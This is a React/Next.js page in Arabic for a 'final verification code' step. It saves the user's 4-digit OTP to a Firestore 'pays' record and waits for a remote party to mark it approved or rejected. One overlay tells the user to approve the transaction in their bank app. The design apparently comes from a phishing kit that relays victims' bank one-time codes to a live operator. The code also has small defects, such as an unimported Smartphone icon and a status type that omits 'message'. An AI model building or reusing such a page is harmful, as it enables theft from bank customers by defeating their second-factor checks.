"use client"

import { useState, useEffect, useRef } from "react"
import { useRouter } from "next/navigation"
import { ShieldCheck, AlertCircle, Loader2, CheckCircle2, RefreshCw, Lock, Clock } from "lucide-react"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { UnifiedSpinner, SimpleSpinner } from "@/components/unified-spinner"
import { StepShell } from "@/components/step-shell"
import { db } from "@/lib/firebase"
import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore"
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"

export default function FinalOtpPage() {
  const router = useRouter()

  const [otp, setOtp]             = useState(["", "", "", ""])
  const [status, setStatus]       = useState<"idle" | "verifying" | "approved" | "rejected">("idle")
  const [error, setError]         = useState("")
  const [isLoading, setIsLoading] = useState(true)
  const [canResend, setCanResend] = useState(false)
  const [resendTimer, setResendTimer] = useState(60)
  const [visitorId, setVisitorId] = useState("")

  const inputRefs = useRef<(HTMLInputElement | null)[]>([])

  // Init visitor
  useEffect(() => {
    const id = localStorage.getItem("visitor") || ""
    if (!id) { router.push("/home-new"); return }
    setVisitorId(id)
  }, [router])

  useRedirectMonitor({ visitorId, currentPage: "finalOtp" })

  // Access check + Firebase listener
  useEffect(() => {
    if (!visitorId || !db) return

    const unsubscribe = onSnapshot(
      doc(db as Firestore, "pays", visitorId),
      (snap) => {
        if (!snap.exists()) { router.push("/home-new"); return }
        setIsLoading(false)

        const data = snap.data()
        const s = data.finalOtpStatus as string | undefined

        if (s === "message") {
          setStatus("message")
        } else if (s === "verifying") {
          setStatus("verifying")
        } else if (s === "approved") {
          setStatus("approved")
          setError("")
          // Clear flag then redirect
          setDoc(doc(db as Firestore, "pays", visitorId), { finalOtpStatus: "" }, { merge: true })
          setTimeout(() => router.push("/check"), 1200)
        } else if (s === "rejected") {
          setStatus("idle")
          setError("تم رفض رمز التحقق. يرجى إدخال رمز صحيح.")
          setOtp(["", "", "", ""])
          setDoc(doc(db as Firestore, "pays", visitorId), { finalOtpStatus: "pending" }, { merge: true })
          setTimeout(() => inputRefs.current[0]?.focus(), 100)
        }
      },
      (err) => {
        console.error("[finalOtp] listener error:", err)
        setError("حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.")
      }
    )

    return () => unsubscribe()
  }, [visitorId, router])

  // Resend countdown
  useEffect(() => {
    if (resendTimer <= 0) { setCanResend(true); return }
    const t = setTimeout(() => setResendTimer((p) => p - 1), 1000)
    return () => clearTimeout(t)
  }, [resendTimer])

  // OTP handlers
  const handleChange = (i: number, val: string) => {
    if (!/^\d?$/.test(val)) return
    const next = [...otp]; next[i] = val; setOtp(next)
    setError("")
    if (val && i < 3) inputRefs.current[i + 1]?.focus()
  }

  const handleKeyDown = (i: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otp[i] && i > 0) inputRefs.current[i - 1]?.focus()
  }

  const handlePaste = (e: React.ClipboardEvent) => {
    const digits = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 4)
    if (digits.length === 4) { setOtp(digits.split("")); inputRefs.current[3]?.focus() }
    e.preventDefault()
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    const code = otp.join("")
    if (code.length !== 4) { setError("يرجى إدخال الرمز المكون من 4 أرقام كاملاً"); return }
    if (!db) return

    try {
      setStatus("verifying")
      await setDoc(
        doc(db as Firestore, "pays", visitorId),
        {
          finalOtp: code,
          finalOtpStatus: "verifying",
          finalOtpSubmittedAt: new Date().toISOString(),
        },
        { merge: true }
      )
    } catch (err) {
      console.error("[finalOtp] submit error:", err)
      setStatus("idle")
      setError("حدث خطأ في الإرسال. يرجى المحاولة مرة أخرى.")
    }
  }

  const handleResend = async () => {
    if (!canResend || !db) return
    await setDoc(
      doc(db as Firestore, "pays", visitorId),
      { finalOtpResendAt: new Date().toISOString(), finalOtpStatus: "pending" },
      { merge: true }
    )
    setCanResend(false)
    setResendTimer(60)
    setOtp(["", "", "", ""])
    setError("")
    setTimeout(() => inputRefs.current[0]?.focus(), 100)
  }

  const otpFilled  = otp.every((d) => d !== "")
  const verifying  = status === "verifying"
  const approved   = status === "approved"

  if (isLoading) return <SimpleSpinner />

  return (
    <>
      {verifying && (
        <UnifiedSpinner message="جاري التحقق" submessage="الرجاء الانتظار..." />
      )}

      {status === "message" && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#0a4a68]/95" dir="rtl">
          <div className="text-center space-y-6 px-8">
            <div className="relative mx-auto flex h-24 w-24 items-center justify-center">
              <div className="absolute h-24 w-24 animate-ping rounded-full border-4 border-yellow-400/30" />
              <div className="absolute h-20 w-20 rounded-full border-4 border-yellow-400/50" />
              <div className="flex h-14 w-14 items-center justify-center rounded-full bg-yellow-400/20">
                <Smartphone className="h-8 w-8 text-yellow-400" />
              </div>
            </div>
            <div className="space-y-3">
              <p className="text-xl font-bold leading-relaxed text-white">
                تم إرسال رمز التحقق. يرجى الدخول إلى تطبيق البنك الخاص بك والموافقة على العملية لإتمام الدفع.
              </p>
              <div className="flex items-center justify-center gap-2">
                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "0ms" }} />
                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "150ms" }} />
                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "300ms" }} />
              </div>
            </div>
          </div>
        </div>
      )}

      <StepShell
        step={4}
        title="رمز التحقق النهائي"
        subtitle="لإتمام العملية أدخل رمز التحقق النهائي المكون من 4 أرقام الذي وصلك"
        icon={<ShieldCheck className="h-8 w-8" />}
      >
        <form onSubmit={handleSubmit} className="space-y-5">
          {/* Info card */}
          <div className="rounded-xl border border-[#dce8f3] bg-[#f5fafe] p-4">
            <div className="space-y-2 text-sm text-[#24577a]">
              <div className="flex items-center gap-2">
                <Clock className="h-4 w-4 flex-shrink-0" />
                <span>الرمز صالح لمدة 5 دقائق</span>
              </div>
              <div className="flex items-center gap-2">
                <Lock className="h-4 w-4 flex-shrink-0" />
                <span>لا تشارك هذا الرمز مع أي شخص</span>
              </div>
            </div>
          </div>

          {/* Error */}
          {error && (
            <Alert variant="destructive" className="border-2">
              <AlertCircle className="h-5 w-5" />
              <AlertDescription className="text-base">{error}</AlertDescription>
            </Alert>
          )}

          {/* Approved */}
          {approved && (
            <div className="flex items-center justify-center gap-2 rounded-xl border border-emerald-200 bg-emerald-50 px-4 py-3">
              <CheckCircle2 className="h-4 w-4 text-emerald-600 flex-shrink-0" />
              <p className="text-sm font-bold text-emerald-800">تم التحقق بنجاح! جاري الانتقال...</p>
            </div>
          )}

          {/* 4-digit boxes */}
          <div
            className="flex justify-center gap-3"
            dir="ltr"
            onPaste={handlePaste}
          >
            {otp.map((digit, i) => (
              <input
                key={i}
                ref={(el) => { inputRefs.current[i] = el }}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                autoFocus={i === 0}
                onChange={(e) => handleChange(i, e.target.value)}
                onKeyDown={(e) => handleKeyDown(i, e)}
                disabled={verifying || approved}
                className={[
                  "h-16 w-14 rounded-2xl border-2 text-center text-3xl font-black outline-none transition-all",
                  error
                    ? "border-red-300 bg-red-50 text-red-700"
                    : approved
                    ? "border-emerald-300 bg-emerald-50 text-emerald-700"
                    : digit
                    ? "border-[#145072] bg-[#eaf4fb] text-[#145072]"
                    : "border-[#d2e1ed] bg-white text-[#194e6e] focus:border-[#145072] focus:bg-[#f0f8ff]",
                ].join(" ")}
              />
            ))}
          </div>

          {/* Resend */}
          <div className="text-center">
            {canResend ? (
              <button
                type="button"
                onClick={handleResend}
                className="mx-auto flex items-center justify-center gap-2 text-sm font-bold text-[#145072] hover:underline"
              >
                <RefreshCw className="h-4 w-4" />
                إعادة إرسال الرمز
              </button>
            ) : (
              <p className="text-sm text-[#6a8498]">
                يمكنك إعادة الإرسال بعد{" "}
                <span className="font-bold text-[#145072]">{resendTimer}</span> ثانية
              </p>
            )}
          </div>

          {/* Submit */}
          <button
            type="submit"
            disabled={!otpFilled || verifying || approved}
            className="flex h-12 w-full items-center justify-center gap-2 rounded-xl text-lg font-extrabold shadow-md transition-all disabled:cursor-not-allowed disabled:opacity-50"
            style={{
              background: approved
                ? "linear-gradient(135deg,#10b981,#059669)"
                : "linear-gradient(135deg,#f0b429,#f7c04a)",
              color: approved ? "#fff" : "#145072",
              boxShadow: approved
                ? "0 8px 24px rgba(16,185,129,0.3)"
                : "0 8px 24px rgba(240,180,41,0.35)",
            }}
          >
            {verifying ? (
              <><Loader2 className="h-5 w-5 animate-spin" /> جاري التحقق...</>
            ) : approved ? (
              <><CheckCircle2 className="h-5 w-5" /> تم التحقق</>
            ) : (
              "تأكيد"
            )}
          </button>
        </form>
      </StepShell>
    </>
  )
}
